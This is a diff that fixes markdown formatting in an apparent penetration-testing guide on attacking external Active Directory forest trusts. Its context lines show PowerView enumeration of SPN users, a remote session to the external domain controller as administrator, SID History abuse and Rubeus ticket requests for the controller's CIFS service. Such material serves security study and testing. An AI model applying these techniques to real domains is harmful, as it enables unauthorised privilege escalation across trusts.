@@ -1,6 +1,5 @@
 # External Forest Domain - OneWay (Inbound) or bidirectional
 
-
 In this scenario an external domain is trusting you (or both are trusting each other), so you can get some kind of access over it.
 
 ## Enumeration
@@ -56,7 +55,7 @@ IsDomain     : True
 # You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
-```
+
 In the previous enumeration it was found that the user **`crossuser`** is inside the **`External Admins`** group who has **Admin access** inside the **DC of the external domain**.
 
 ## Initial Access
@@ -67,7 +66,6 @@ You can use **Powerview functions** to **enumerate** the **other domain** using 
 
 ```bash
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
-```
 ```
 
 [[./]]
@@ -81,10 +79,10 @@ Using a regular method with the credentials of the users who is has access to th
 ```bash
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
-```
+
 ### SID History Abuse
 
-You could also abuse [[sid-history-injection.md|**SID History**]] across a forest trust.
+You could also abuse [**SID History**](sid-history-injection.md) across a forest trust.
 
 If a user is migrated **from one forest to another** and **SID Filtering is not enabled**, it becomes possible to **add a SID from the other forest**, and this **SID** will be **added** to the **user's token** when authenticating **across the trust**.
 
@@ -107,7 +105,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-```
+
 ### Full way impersonating the user
 
 ```bash
@@ -123,6 +121,4 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-```
-
 
